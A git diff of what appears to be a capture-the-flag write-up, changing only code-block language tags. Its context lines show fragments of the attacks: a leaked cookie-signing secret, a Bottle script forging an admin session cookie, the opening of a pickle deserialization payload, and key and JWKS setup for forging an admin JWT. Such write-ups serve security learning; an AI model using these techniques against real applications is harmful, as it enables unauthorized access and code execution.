@@ -52,13 +52,13 @@ In the function for `/sign`, I can see the if we do not have a session prior we 
 
 Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from `/app/config/secret.py`:
 
-```Python
+```python
 sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
 ```
 
 I then installed Bottle and used it to serve webpage that sets signed cookie with data `{"name": "admin"}` to obtain the admin cookie:
 
-```Python
+```python
 from bottle import route, run, request, response
 
 @route('/hello')
@@ -89,7 +89,7 @@ Bottle is a rather small framework, when I was looking into [the source code of 
 
 Our team crafted a similar payload as the cookie value based on this exploit and got the flag:
 
-```
+```python
 import pickle
 import base64
 import os
@@ -135,14 +135,14 @@ When I reviewed the challenge code again, I noticed the `/logout` endpoint has a
 
 Generate RSA private and public key:
 
-```
+```bash
 openssl genrsa -out rsa.private 512
 openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
 ```
 
 Make `jwks.json` to be served with HTTP server:
 
-```JSON
+```json
 {
     "keys": [
         {
@@ -157,7 +157,7 @@ Make `jwks.json` to be served with HTTP server:
 
 Generate the admin token:
 
-```Python
+```python
 import jwt
 
 private_key = open('rsa.private').read()
